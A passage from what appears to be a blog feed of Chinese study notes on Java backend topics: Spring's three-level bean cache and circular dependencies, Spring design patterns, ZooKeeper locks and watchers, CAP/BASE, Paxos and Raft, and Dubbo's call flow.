<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DefaultSingletonBeanRegistry</span> <span class="keyword">extends</span> <span class="title class_">SimpleAliasRegistry</span> <span class="keyword">implements</span> <span class="title class_">SingletonBeanRegistry</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/** Maximum number of suppressed exceptions to preserve. */</span></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">SUPPRESSED_EXCEPTIONS_LIMIT</span> <span class="operator">=</span> <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">/** Cache of singleton objects: bean name to bean instance. */</span></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, Object&gt; singletonObjects = <span class="keyword">new</span> <span class="title class_">ConcurrentHashMap</span>&lt;&gt;(<span class="number">256</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/** Cache of singleton factories: bean name to ObjectFactory. */</span></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, ObjectFactory&lt;?&gt;&gt; singletonFactories = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(<span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/** Cache of early singleton objects: bean name to bean instance. */</span></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, Object&gt; earlySingletonObjects = <span class="keyword">new</span> <span class="title class_">ConcurrentHashMap</span>&lt;&gt;(<span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">protected</span> Object <span class="title function_">getSingleton</span><span class="params">(String beanName, <span class="type">boolean</span> allowEarlyReference)</span> &#123;  </span><br><span class="line">	<span class="comment">// 从 singletonObjects 获取实例，singletonObjects 中缓存的实例都是完全实例化好的 bean，可以直接使用</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">singletonObject</span> <span class="operator">=</span> <span class="built_in">this</span>.singletonObjects.get(beanName);  </span><br><span class="line">    <span class="keyword">if</span> (singletonObject == <span class="literal">null</span> &amp;&amp; <span class="built_in">this</span>.isSingletonCurrentlyInCreation(beanName)) &#123;  </span><br><span class="line">        <span class="keyword">synchronized</span>(<span class="built_in">this</span>.singletonObjects) &#123;  </span><br><span class="line">            singletonObject = <span class="built_in">this</span>.earlySingletonObjects.get(beanName);  </span><br><span class="line">            <span class="keyword">if</span> (singletonObject == <span class="literal">null</span> &amp;&amp; allowEarlyReference) &#123;  </span><br><span class="line">                ObjectFactory&lt;?&gt; singletonFactory = (ObjectFactory)<span class="built_in">this</span>.singletonFactories.get(beanName);  </span><br><span class="line">                <span class="keyword">if</span> (singletonFactory != <span class="literal">null</span>) &#123;  </span><br><span class="line">	                <span class="comment">// 加入到三级缓存，暴漏早期对象用于解决循环依赖</span></span><br><span class="line">                    singletonObject = singletonFactory.getObject();  </span><br><span class="line">                    <span class="built_in">this</span>.earlySingletonObjects.put(beanName, singletonObject);  </span><br><span class="line">                    <span class="built_in">this</span>.singletonFactories.remove(beanName);  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> singletonObject != NULL_OBJECT ? singletonObject : <span class="literal">null</span>;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p>singletonObjects：用于存放初始化好的 bean 实例，存放完整对象。</p>
</li>
<li class="lvl-2">
<p>earlySingletonObjects，用于存放初始化中的 bean，来解决循环依赖。存放半成品对象，属性还未赋值的对象。</p>
</li>
<li class="lvl-2">
<p>singletonFactories：用于存放 bean 工厂，bean 工厂所生成的 bean 还没有完成初始化 bean。存放的是 <code>ObjectFactory&lt;?&gt;</code> 类型的 lambda 表达式，就是这用于处理 AOP 循环依赖的。</p>
</li>
</ul>
<p>相互引用的bean，A依赖B，把A原始对象包装成SingletonFactory 放入三级缓存<br>
B依赖A，B依赖的A是从singletonFactories获取bean工厂调用getObject方法生产bean放入earlySingletonObjects。</p>
<h1>5 参考</h1>
<ol>
<li class="lvl-3">
<p><a href="https://zhuanlan.zhihu.com/p/89412539#:~:text=%E9%9D%A2%E8%AF%95%E5%BF%85%E9%97%AE%EF%BC%9ASpring%20%E5%BE%AA%E7%8E%AF%E4%BE%9D%E8%B5%96%E7%9A%84%E4%B8%89%E7%A7%8D%E6%96%B9%E5%BC%8F%201%20%E7%AC%AC%E4%B8%80%E7%A7%8D%EF%BC%9A%E6%9E%84%E9%80%A0%E5%99%A8%E5%8F%82%E6%95%B0%E5%BE%AA%E7%8E%AF%E4%BE%9D%E8%B5%96,2%20%E7%AC%AC%E4%BA%8C%E7%A7%8D%EF%BC%9Asetter%E6%96%B9%E5%BC%8F%E5%8D%95%E4%BE%8B%EF%BC%8C%E9%BB%98%E8%AE%A4%E6%96%B9%E5%BC%8F%203%20%E7%AC%AC%E4%B8%89%E7%A7%8D%EF%BC%9Asetter%E6%96%B9%E5%BC%8F%E5%8E%9F%E5%9E%8B%EF%BC%8Cprototype">面试必问：Spring 循环依赖的三种方式 - 知乎 (zhihu.com)</a></p>
</li>
<li class="lvl-3">
<p><a href="https://bugstack.cn/md/java/interview/2021-05-05-%E9%9D%A2%E7%BB%8F%E6%89%8B%E5%86%8C%20%C2%B7%20%E7%AC%AC31%E7%AF%87%E3%80%8ASpring%20Bean%20IOC%E3%80%81AOP%20%E5%BE%AA%E7%8E%AF%E4%BE%9D%E8%B5%96%E8%A7%A3%E8%AF%BB%E3%80%8B.html">面经手册 · 第31篇《Spring Bean IOC、AOP 循环依赖解读》 | 小傅哥 bugstack 虫洞栈</a></p>
</li>
<li class="lvl-3">
<p><a href="https://zhuanlan.zhihu.com/p/635659531">Spring 循环依赖那些事儿（含Spring详细流程图） - 知乎 (zhihu.com)</a></p>
</li>
<li class="lvl-3">
<p><a href="https://blog.csdn.net/bingguang1993/article/details/88915576">什么是循环依赖以及解决方式-CSDN博客</a></p>
</li>
<li class="lvl-3">
<p><a href="https://springdoc.cn/spring-bean-circular-dependencies/">Spring Bean 循环依赖 - spring 中文网 (springdoc.cn)</a>(*****)</p>
</li>
<li class="lvl-3">
<p><a href="https://blog.csdn.net/chaitoudaren/article/details/105060882">Spring源码最难问题《当Spring AOP遇上循环依赖》_循环依赖aop在那个阶段-CSDN博客</a></p>
</li>
<li class="lvl-3">
<p><a href="https://springdoc.cn/inversion-control-and-dependency-injection-in-spring/">Spring 中的控制反转（IoC）和依赖注入（DI） - spring 中文网 (springdoc.cn)</a></p>
</li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>Spring：设计模式</title>
    <url>/2024/05/27/%E6%A1%86%E6%9E%B6/Spring/Spring%EF%BC%9A%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<ul class="lvl-0">
<li class="lvl-2">
<p><strong>工厂设计模式</strong> : Spring 使用工厂模式通过 <code>BeanFactory</code>、<code>ApplicationContext</code> 创建 bean 对象。</p>
</li>
<li class="lvl-2">
<p><strong>代理设计模式</strong> : Spring AOP 功能的实现。</p>
</li>
<li class="lvl-2">
<p><strong>单例设计模式</strong> : Spring 中的 Bean 默认都是单例的。</p>
</li>
<li class="lvl-2">
<p><strong>模板方法模式</strong> : Spring 中 <code>jdbcTemplate</code>、<code>hibernateTemplate</code> 等以 Template 结尾的对数据库操作的类，它们就使用到了模板模式。</p>
</li>
<li class="lvl-2">
<p><strong>包装器设计模式</strong> : 我们的项目需要连接多个数据库，而且不同的客户在每次访问中根据需要会去访问不同的数据库。这种模式让我们可以根据客户的需求能够动态切换不同的数据源。</p>
</li>
<li class="lvl-2">
<p><strong>观察者模式:</strong> Spring 事件驱动模型就是观察者模式很经典的一个应用。</p>
</li>
<li class="lvl-2">
<p><strong>适配器模式</strong> :Spring AOP 的增强或通知(Advice)使用到了适配器模式、spring MVC 中也是用到了适配器模式适配<code>Controller</code>。</p>
</li>
</ul>
<h1>1 工厂设计模式</h1>
<p>Spring 使用工厂模式可以通过 <code>BeanFactory</code> 或 <code>ApplicationContext</code> 创建 bean 对象。</p>
<p><strong>两者对比：</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>BeanFactory</code>：延迟注入(使用到某个 bean 的时候才会注入),相比于<code>ApplicationContext</code> 来说会占用更少的内存，程序启动速度更快。</p>
</li>
<li class="lvl-2">
<p><code>ApplicationContext</code>：容器启动的时候，不管你用没用到，一次性创建所有 bean 。<code>BeanFactory</code> 仅提供了最基本的依赖注入支持，<code>ApplicationContext</code> 扩展了 <code>BeanFactory</code> ,除了有<code>BeanFactory</code>的功能还有额外更多功能</p>
</li>
</ul>
<h1>2 单例设计模式</h1>
<p>在我们的系统中，有一些对象其实我们只需要一个，比如说：线程池、缓存、对话框、注册表、日志对象、充当打印机、显卡等设备驱动程序的对象。事实上，这一类对象只能有一个实例，如果制造出多个实例就可能会导致一些问题的产生，比如：程序的行为异常、资源使用过量、或者不一致性的结果。</p>
<p><strong>使用单例模式的好处</strong> :</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>对于频繁使用的对象，可以省略创建对象所花费的时间，这对于那些重量级对象而言，是非常可观的一笔系统开销；</p>
</li>
<li class="lvl-2">
<p>由于 new 操作的次数减少，因而对系统内存的使用频率也会降低，这将减轻 GC 压力，缩短 GC 停顿时间。</p>
</li>
</ul>
<h1>3 代理设计模式</h1>
<h2 id="3-1-代理模式在AOP中的应用">3.1 代理模式在AOP中的应用</h2>
<p><strong>AOP(Aspect-Oriented Programming，面向切面编程)</strong> 能够将那些与业务无关，却为业务模块所共同调用的逻辑或责任（例如事务处理、日志管理、权限控制等）封装起来，便于减少系统的重复代码，降低模块间的耦合度，并有利于未来的可拓展性和可维护性。</p>
<p><strong>Spring AOP 就是基于动态代理的</strong>，如果要代理的对象，实现了某个接口，那么 Spring AOP 会使用 <strong>JDK Proxy</strong> 去创建代理对象，而对于没有实现接口的对象，就无法使用 JDK Proxy 去进行代理了，这时候 Spring AOP 会使用 <strong>Cglib</strong> 生成一个被代理对象的子类来作为代理，如下图所示：</p>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202405271127753.png" alt="image.png"></p>
<h2 id="3-2-Spring-AOP和AspectJ-AOP">3.2 Spring AOP和AspectJ AOP</h2>
<p><strong>Spring AOP 属于运行时增强，而 AspectJ 是编译时增强。</strong> Spring AOP 基于代理(Proxying)，而 AspectJ 基于字节码操作(Bytecode Manipulation)。</p>
<p>Spring AOP 已经集成了 AspectJ ，AspectJ 应该算的上是 Java 生态系统中最完整的 AOP 框架了。AspectJ 相比于 Spring AOP 功能更加强大，但是 Spring AOP 相对来说更简单，</p>
<h1>4 模板方法</h1>
<p>模板方法模式是一种行为设计模式，它定义一个操作中的算法的骨架，而将一些步骤延迟到子类中。 模板方法使得子类可以不改变一个算法的结构即可重定义该算法的某些特定步骤的实现方式。</p>
<h1>5 观察者模式</h1>
<h1>6 适配器模式</h1>
<h1>7 装饰者模式</h1>
<h1>8 参考</h1>
<p><a href="https://javaguide.cn/system-design/framework/spring/spring-design-patterns-summary.html">Spring 中的设计模式详解 | JavaGuide</a></p>
]]></content>
      <categories>
        <category>框架</category>
      </categories>
      <tags>
        <tag>Spring</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2024/06/11/%E6%A1%86%E6%9E%B6/%E5%88%86%E5%B8%83%E5%BC%8F/ZooKeeper/</url>
    <content><![CDATA[<h1>1 ZAB</h1>
<h2 id="1-1-Raft算法和ZAB算法的异同点">1.1 Raft算法和ZAB算法的异同点</h2>
<table>
<thead>
<tr>
<th>Leader选举</th>
<th>选举已提交(commit)最大编号日志所在节点</th>
<th>选举最大ZXID的Proposal(含未提交)所在节点</th>
</tr>
</thead>
<tbody>
<tr>
<td>新Leader是否提交前任Leader未提交的消息</td>
<td>提交</td>
<td>提交</td>
</tr>
<tr>
<td>Leader数量</td>
<td>1</td>
<td>1</td>
</tr>
<tr>
<td>Quorum作用范围</td>
<td>Leader任内有效，以自身消息为准</td>
<td>Leader任内有效，以自身消息为准</td>
</tr>
</tbody>
</table>
<h1>2 Zookeeper理论知识</h1>
<h2 id="2-1-数据模型">2.1 数据模型</h2>
<p><strong>使用了 <code>znode</code> 作为数据节点</strong> 。<code>znode</code> 是 <code>zookeeper</code> 中的最小数据单元，每个 <code>znode</code> 上都可以保存数据，同时还可以挂载子节点，形成一个树形化命名空间。</p>
<p>每个 <code>znode</code> 都有自己所属的 <strong>节点类型</strong> 和 <strong>节点状态</strong>。</p>
<p>其中节点类型可以分为 <strong>持久节点</strong>、<strong>持久顺序节点</strong>、<strong>临时节点</strong> 和 <strong>临时顺序节点</strong>。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>持久节点：一旦创建就一直存在，直到将其删除。</p>
</li>
<li class="lvl-2">
<p>持久顺序节点：一个父节点可以为其子节点 <strong>维护一个创建的先后顺序</strong> ，这个顺序体现在 <strong>节点名称</strong> 上，是节点名称后自动添加一个由 10 位数字组成的数字串，从 0 开始计数。</p>
</li>
<li class="lvl-2">
<p>临时节点：临时节点的生命周期是与 <strong>客户端会话</strong> 绑定的，<strong>会话消失则节点消失</strong> 。临时节点 <strong>只能做叶子节点</strong> ，不能创建子节点。</p>
</li>
<li class="lvl-2">
<p>临时顺序节点：父节点可以创建一个维持了顺序的临时节点(和前面的持久顺序性节点一样)。</p>
</li>
</ul>
<h2 id="2-2-会话">2.2 会话</h2>
<h2 id="2-3-ACL">2.3 ACL</h2>
<h2 id="2-4-Watcher机制">2.4 Watcher机制</h2>
<p><code>Watcher</code> 为事件监听器，是 <code>zk</code> 非常重要的一个特性，很多功能都依赖于它，它有点类似于订阅的方式，即客户端向服务端 <strong>注册</strong> 指定的 <code>watcher</code> ，当服务端符合了 <code>watcher</code> 的某些事件或要求则会 <strong>向客户端发送事件通知</strong> ，客户端收到通知后找到自己定义的 <code>Watcher</code> 然后 <strong>执行相应的回调方法</strong> 。</p>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202406111701144.png" alt="image.png"></p>
<h1>3 Zookeeper应用场景</h1>
<h2 id="3-1-选主">3.1 选主</h2>
<h2 id="3-2-数据发布-订阅">3.2 数据发布/订阅</h2>
<h2 id="3-3-分布式锁">3.3 分布式锁</h2>
<p><code>创建节点的唯一性</code>，我们可以让多个客户端同时创建一个临时节点，<strong>创建成功的就说明获取到了锁</strong> 。然后没有获取到锁的客户端也像上面选主的非主节点创建一个 <code>watcher</code> 进行节点状态的监听，如果这个互斥锁被释放了（可能获取锁的客户端宕机了，或者那个客户端主动释放了锁）可以调用回调函数重新获得锁。</p>
<div class="tips">
<p>共享锁和独占锁</p>
</div>
<p><code>有序的节点</code><br>
规定所有创建节点必须有序，当你是读请求（要获取共享锁）的话，如果 <strong>没有比自己更小的节点，或比自己小的节点都是读请求</strong> ，则可以获取到读锁，然后就可以开始读了。<strong>若比自己小的节点中有写请求</strong> ，则当前客户端无法获取到读锁，只能等待前面的写请求完成。</p>
<p>如果你是写请求（获取独占锁），若 <strong>没有比自己更小的节点</strong> ，则表示当前客户端可以直接获取到写锁，对数据进行修改。若发现 <strong>有比自己更小的节点，无论是读操作还是写操作，当前客户端都无法获取到写锁</strong> ，等待所有前面的操作完成。</p>
<p>这就很好地同时实现了共享锁和独占锁，当然还有优化的地方，比如当一个锁得到释放它会通知所有等待的客户端从而造成 <strong>羊群效应</strong> 。此时你可以通过让等待的节点只监听他们前面的节点。</p>
<p><strong>读请求监听比自己小的最后一个写请求节点，写请求只监听比自己小的最后一个节点</strong></p>
<h2 id="3-4-命名服务">3.4 命名服务</h2>
<h2 id="3-5-集群管理和注册中心">3.5 集群管理和注册中心</h2>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2024/10/06/%E6%A1%86%E6%9E%B6/%E9%AB%98%E6%80%A7%E8%83%BD&amp;%E9%AB%98%E5%8F%AF%E7%94%A8/%E5%A4%A7%E6%95%B0%E6%8D%AE/</url>
    <content><![CDATA[<h1>1 海量数据</h1>
<p>分库分表副本数据一致性高效查询</p>
<h1>2 参考</h1>
<p><a href="https://mp.weixin.qq.com/s/xGYM0pXAHfaLMpTxBJvLBg">字节面试：百亿级存储，怎么设计？只是分库分表？ (qq.com)</a></p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2024/02/20/%E6%A1%86%E6%9E%B6/%E5%88%86%E5%B8%83%E5%BC%8F/%E5%88%86%E5%B8%83%E5%BC%8F/</url>
    <content><![CDATA[<blockquote>
<p><strong>CAP 是分布式系统设计理论，BASE 是 CAP 理论中 AP 方案的延伸。</strong></p>
</blockquote>
<h1>1 CAP理论</h1>
<p><strong>CAP</strong> 也就是 <strong>Consistency（一致性）</strong>、<strong>Availability（可用性）</strong>、<strong>Partition Tolerance（分区容错性）</strong></p>
<ul class="lvl-0">
<li class="lvl-2"><strong>一致性（Consistency）</strong> : 所有节点访问同一份最新的数据副本</li>
<li class="lvl-2"><strong>可用性（Availability）</strong>: 非故障的节点在合理的时间内返回合理的响应（不是错误或者超时的响应）。</li>
<li class="lvl-2"><strong>分区容错性（Partition Tolerance）</strong> : 分布式系统出现网络分区的时候，仍然能够对外提供服务。</li>
</ul>
<p>Quorum机制（法定人数机制<br>
<strong>分布式系统理论上不可能选择 CA 架构，只能选择 CP 或者 AP 架构。</strong> 比如 ZooKeeper、HBase 就是 CP 架构，Cassandra、Eureka 就是 AP 架构，Nacos 不仅支持 CP 架构也支持 AP 架构。</p>
<h1>2 数据一致性</h1>
<p>一些分布式系统通过复制数据来提高系统的可靠性和容错性，并且将数据的不同的副本存放在不同的机器，由于维护数据副本的一致性代价高，因此许多系统<strong>采用弱一致性来提高性能</strong>，一些不同的一致性模型也相继被提出。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>强一致性</strong>： 要求无论更新操作实在哪一个副本执行，之后所有的读操作都要能获得最新的数据。</p>
</li>
<li class="lvl-2">
<p><strong>弱一致性</strong>：用户读到某一操作对系统特定数据的更新需要一段时间，我们称这段时间为“不一致性窗口”。</p>
</li>
<li class="lvl-2">
<p><strong>最终一致性</strong>：是弱一致性的一种特例，保证用户**最终（即窗口尽量长）**能够读取到某操作对系统特定数据的更新。</p>
</li>
</ul>
<blockquote>
<p>[!question] 分布式一致性(缓存与数据库一致性)</p>
<ol>
<li class="lvl-3">分布式事务：两段提交</li>
<li class="lvl-3">分布式锁</li>
<li class="lvl-3">消息队列、消息持久化、重试、幂等操作</li>
<li class="lvl-3">Raft / Paxos 等一致性算法</li>
</ol>
</blockquote>
<h1>3 BASE理论</h1>
<p><strong>BASE</strong> 是 <strong>Basically Available（基本可用）</strong>、<strong>Soft-state（软状态）</strong> 和 <strong>Eventually Consistent（最终一致性）</strong> 三个短语的缩写。</p>
<h2 id="3-1-基本可用">3.1 基本可用</h2>
<p>基本可用是指分布式系统在出现不可预知故障的时候，允许损失部分可用性。但是，这绝不等价于系统不可用。</p>
<p><strong>什么叫允许损失部分可用性呢？</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>响应时间上的损失</strong>: 正常情况下，处理用户请求需要 0.5s 返回结果，但是由于系统出现故障，处理用户请求的时间变为 3 s。</p>
</li>
<li class="lvl-2">
<p><strong>系统功能上的损失</strong>：正常情况下，用户可以使用系统的全部功能，但是由于系统访问量突然剧增，系统的部分非核心功能无法使用。</p>
</li>
</ul>
<h2 id="3-2-软状态">3.2 <a href="#%E8%BD%AF%E7%8A%B6%E6%80%81">软状态</a></h2>
<p>软状态指允许系统中的数据存在中间状态（<strong>CAP 理论中的数据不一致</strong>），并认为该中间状态的存在不会影响系统的整体可用性，即允许系统在不同节点的数据副本之间进行数据同步的过程存在延时。</p>
<h2 id="3-3-最终一致性">3.3 <a href="#%E6%9C%80%E7%BB%88%E4%B8%80%E8%87%B4%E6%80%A7">最终一致性</a></h2>
<p>最终一致性强调的是系统中所有的数据副本，在经过一段时间的同步后，最终能够达到一个一致的状态。因此，最终一致性的本质是需要系统保证最终数据能够达到一致，而不需要实时保证系统数据的强一致性。</p>
<blockquote>
<p>分布式一致性的 3 种级别：</p>
<ol>
<li class="lvl-3"><strong>强一致性</strong>：系统写入了什么，读出来的就是什么。</li>
<li class="lvl-3"><strong>弱一致性</strong>：不一定可以读取到最新写入的值，也不保证多少时间之后读取到的数据是最新的，只是会尽量保证某个时刻达到数据一致的状态。</li>
<li class="lvl-3"><strong>最终一致性</strong>：弱一致性的升级版，系统会保证在一定时间内达到数据一致的状态。</li>
</ol>
<p><strong>业界比较推崇是最终一致性级别，但是某些对数据一致要求十分严格的场景比如银行转账还是要保证强一致性。</strong></p>
</blockquote>
<h1>4 共识算法</h1>
<blockquote>
<p>共识算法的作用是让分布式系统中的多个节点之间对某个提案（Proposal）达成一致的看法。提案的含义在分布式系统中十分宽泛，像哪一个节点是 Leader 节点、多个事件发生的顺序等等都可以是一个提案。</p>
</blockquote>
<p>共识是可容错系统中的一个基本问题：即使面对故障，服务器也可以在共享状态上达成一致。</p>
<p>共识算法允许一组节点像一个整体一样一起工作，即使其中的一些节点出现故障也能够继续工作下去，其正确性主要是源于复制状态机的性质：一组<code>Server</code>的状态机计算相同状态的副本，即使有一部分的<code>Server</code>宕机了它们仍然能够继续运行。<br>
<img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202402232043613.png" alt="image.png"></p>
<p><a href="https://javaguide.cn/distributed-system/protocol/raft-algorithm.html">https://javaguide.cn/distributed-system/protocol/raft-algorithm.html</a></p>
<h1>5 Basic Paxos 算法</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>提议者（Proposer）</strong>：也可以叫做协调者（coordinator），提议者负责接受客户端的请求并发起提案。提案信息通常包括提案编号 (Proposal ID) 和提议的值 (Value)。</p>
</li>
<li class="lvl-2">
<p><strong>接受者（Acceptor）</strong>：也可以叫做投票员（voter），负责对提议者的提案进行投票，同时需要记住自己的投票历史；</p>
</li>
<li class="lvl-2">
<p><strong>学习者（Learner）</strong>：如果有超过半数接受者就某个提议达成了共识，那么学习者就需要接受这个提议，并就该提议作出运算，然后将运算结果返回给客户端。<br>
<img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202405211456396.png" alt="image.png|450"></p>
</li>
</ul>
<h1>6 Raft</h1>
<h2 id="6-1-基础">6.1 基础</h2>
<h3 id="6-1-1-节点类型">6.1.1 节点类型</h3>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>Leader</code>：负责发起心跳，响应客户端，创建日志，同步日志。</p>
</li>
<li class="lvl-2">
<p><code>Candidate</code>：Leader 选举过程中的临时角色，由 Follower 转化而来，发起投票参与竞选。</p>
</li>
<li class="lvl-2">
<p><code>Follower</code>：接受 Leader 的心跳和日志同步数据，投票给 Candidate。</p>
</li>
</ul>
<h3 id="6-1-2-任期">6.1.2 任期</h3>
<h3 id="6-1-3-日志">6.1.3 日志</h3>
<h2 id="6-2-领导人选举">6.2 领导人选举</h2>
<p>raft 使用心跳机制来触发 Leader 的选举。</p>
<p>如果一台服务器能够收到来自 Leader 或者 Candidate 的有效信息，那么它会一直保持为 Follower 状态，并且刷新自己的 electionElapsed，重新计时。</p>
<p>Leader 会向所有的 Follower 周期性发送心跳来保证自己的 Leader 地位。如果一个 Follower 在一个周期内没有收到心跳信息，就叫做选举超时，然后它就会认为此时没有可用的 Leader，并且开始进行一次选举以选出一个新的 Leader。</p>
<h2 id="6-3-日志复制">6.3 日志复制</h2>
<p>一旦选出了 Leader，它就开始接受客户端的请求。每一个客户端的请求都包含一条需要被复制状态机（<code>Replicated State Machine</code>）执行的命令。</p>
<p>Leader 收到客户端请求后，会生成一个 entry，包含<code>&lt;index,term,cmd&gt;</code>，再将这个 entry 添加到自己的日志末尾后，向所有的节点广播该 entry，要求其他服务器复制这条 entry。</p>
<p>如果 Follower 接受该 entry，则会将 entry 添加到自己的日志后面，同时返回给 Leader 同意。</p>
<p>如果 Leader 收到了多数的成功响应，Leader 会将这个 entry 应用到自己的状态机中，之后可以称这个 entry 是 committed 的，并且向客户端返回执行结果。</p>
<p>raft 保证以下两个性质：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>在两个日志里，有两个 entry 拥有相同的 index 和 term，那么它们一定有相同的 cmd</p>
</li>
<li class="lvl-2">
<p>在两个日志里，有两个 entry 拥有相同的 index 和 term，那么它们前面的 entry 也一定相同</p>
</li>
</ul>
<h1>7 主从、集群、分布式的区别</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>分布式：多个系统协同合作完成一个特定任务的系统。分布式是解决中心化管理的问题，把所有的任务叠加到一个节点处理，太慢了。所以把一个大的问题拆分为多个小的问题，并分别解决，最终协同合作。分布式的主要工作是分解任务，将职能拆解。</p>
</li>
<li class="lvl-2">
<p>集群：集群主要的使用场景是为了分担请求的压力，也就是在几个服务器上部署相同的应用程序，来分担客户端请求。当压力进一步增大的时候，可能在需要存储的部分，mysql 无法面对很多的写压力。因为在 mysql 做成集群之后，主要的写压力还是在 master 的机器上面，其他 slave 机器无法分担写压力，从而这个时候，也就引出来分布式。</p>
</li>
</ul>
<p><strong>将一套系统拆分成不同子系统部署在不同服务器上（这叫分布式），</strong></p>
<p><strong>然后部署多个相同的子系统在不同的服务器上（这叫集群），部署在不同服务器上的同一个子系统应做负载均衡。</strong></p>
<p><strong>分布式：一个业务拆分为多个子业务，部署在多个服务器上 。</strong></p>
<p><strong>集群：同一个业务，部署在多个服务器上 。</strong></p>
<p>主从、集群和分布式是计算机系统中常见的架构模式，它们有不同的特点和用途：</p>
<ol>
<li class="lvl-3">
<p>主从（Master-Slave）：</p>
<ul class="lvl-2">
<li class="lvl-6">主从架构是一种单点控制的架构，其中有一个主节点和一个或多个从节点。</li>
<li class="lvl-6">主节点通常负责处理所有的请求和决策，而从节点用于执行主节点分派的任务或保存数据的备份副本。</li>
<li class="lvl-6">主从架构通常用于提高系统的可用性和容错性。如果主节点失败，可以将其中一个从节点提升为主节点，以保持系统的运行。</li>
<li class="lvl-6">主从架构适用于那些需要单一决策权和数据同步的应用，如数据库复制、负载均衡等。</li>
</ul>
</li>
<li class="lvl-3">
<p>集群（Cluster）：</p>
<ul class="lvl-2">
<li class="lvl-6"><strong>集群是由多个节点组成的计算机系统</strong>，这些节点共同协作以提供某种服务或功能。</li>
<li class="lvl-6">集群节点通常是对等的，它们可以相互协作，共同处理请求，以提高性能和容错性。</li>
<li class="lvl-6">集群可以用于各种用途，包括负载均衡、高可用性、并行计算等。</li>
<li class="lvl-6">集群可以是对称的（每个节点都具有相同的角色和功能）或非对称的（某些节点具有特殊的角色，如主节点）。</li>
</ul>
</li>
<li class="lvl-3">
<p>分布式（Distributed）：</p>
<ul class="lvl-2">
<li class="lvl-6">分布式架构是指系统的组件分布在多个地理位置或计算节点上，它们通过网络通信协同工作。</li>
<li class="lvl-6">分布式系统的目标是提高性能、扩展性和可用性，允许系统在多个节点上并行执行任务。</li>
<li class="lvl-6">分布式系统可以包括多个集群，每个集群可能都有自己的主从结构，以满足系统的需求。</li>
<li class="lvl-6">分布式系统通常需要处理分布式计算、数据同步、一致性和容错性等复杂问题。</li>
</ul>
</li>
</ol>
<p>总之，主从是一种单点控制的架构，集群是多个节点共同协作的架构，分布式是多个节点分布在不同地方并通过网络通信协同工作的架构。这些不同的架构模式在不同的应用场景中有不同的优点和局限性。选择哪种架构取决于应用的需求和目标。</p>
<p>集群是个物理形态，分布式是个工作方式。分布式是以缩短单个任务的执行时间来提升效率的，而集群则是通过提高单位时间内执行的任务数来提升效率。<br>
分布式：一个业务分拆多个子业务，部署在不同的服务器上。<br>
集群：同一个业务，部署在多个服务器上</p>
]]></content>
  </entry>
  <entry>
    <title>RPC：Dubbo、gRPC、HSF</title>
    <url>/2024/06/11/%E6%A1%86%E6%9E%B6/%E5%88%86%E5%B8%83%E5%BC%8F/RPC%EF%BC%9ADubbo%E3%80%81gRPC%E3%80%81HSF/</url>
    <content><![CDATA[<ul class="lvl-0">
<li class="lvl-2">
<p>服务注册</p>
</li>
<li class="lvl-2">
<p>服务发现</p>
</li>
<li class="lvl-2">
<p>服务治理</p>
</li>
</ul>
<h1>1 Dubbo(HSF)</h1>
<h2 id="1-1-架构">1.1 架构</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>注册中心：注册中心负责服务地址的注册与查找，生产者在此注册并发布内容，消费者在此订阅并接收发布的内容。</p>
</li>
<li class="lvl-2">
<p>消费者：客户端，从注册中心获取到方法，可以调用生产者中的方法。</p>
</li>
<li class="lvl-2">
<p>生产者：服务端，生产内容，生产前需要依赖容器（先启动容器）。</p>
</li>
</ul>
<h2 id="1-2-Dubbo调用流程">1.2 Dubbo调用流程</h2>
<p>1、服务提供者启动，开启Netty服务，创建Zookeeper客户端，<mark>向注册中心注册服务</mark>；</p>
<p>2、服务消费者启动，通过Zookeeper向注册中心<mark>获取服务提供者列表</mark>，与服务提供者通过Netty建立长连接；</p>
<p>3、服务消费者通过接口开始远程调用服务，ProxyFactory通过初始化Proxy对象，Proxy<mark>通过创建动态代理对象</mark>；</p>
<p>4、<mark>动态代理对象通过invoke方法，层层包装生成一个Invoker对象，该对象包含了代理对象</mark>；</p>
<p>5、Invoker通过<mark>路由，负载均衡</mark>选择了一个最合适的服务提供者，在通过加入各种过滤器，协议层包装生成一个新的DubboInvoker对象；</p>
